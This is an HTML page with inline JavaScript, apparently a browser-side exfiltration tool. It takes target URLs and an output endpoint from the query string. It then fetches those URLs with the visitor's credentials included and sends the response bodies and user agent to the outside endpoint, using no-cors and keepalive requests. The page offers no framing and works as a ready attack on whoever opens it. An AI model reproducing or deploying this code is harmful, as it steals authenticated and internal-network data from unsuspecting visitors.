<!DOCTYPE html>
<html>
<head><title>Fetcher</title></head>
<body>
<pre id="log"></pre>
<script>
    const log = msg => document.getElementById("log").textContent += msg + "\n";

    async function postOut(out, payload) {
        const resp = await fetch(out, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            keepalive: true   // ✅ survit à la décharge de page
        });
        if (!resp.ok) throw new Error(`out répondu ${resp.status}`);
        return resp;
    }

    async function postOut(out, payload) {
        await fetch(out + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0,2000)), {
            mode: "no-cors",
            keepalive: true
        });
    }

    (async () => {
        const params = new URLSearchParams(window.location.search);
        const urls = (params.get("urls") || "").split(",").map(u => u.trim()).filter(Boolean);
        const out  = params.get("out");

        await postOut(out, { event: "start", ua: navigator.userAgent });

        // Parallel, timeout 4s, résultat envoyé dès qu'il arrive
        await Promise.allSettled(urls.map(async url => {
            try {
                const ctrl = new AbortController();
                setTimeout(() => ctrl.abort(), 4000);
                const r = await fetch(url, { signal: ctrl.signal, credentials: "include" });
                const body = await r.text();
                await postOut(out, { event: "result", url, status: r.status, body: body.slice(0, 3000) });
            } catch(e) {
                await postOut(out, { event: "result", url, error: e.message });
            }
        }));

        await postOut(out, { event: "done" });
    })();

</script>
</body>
</html>
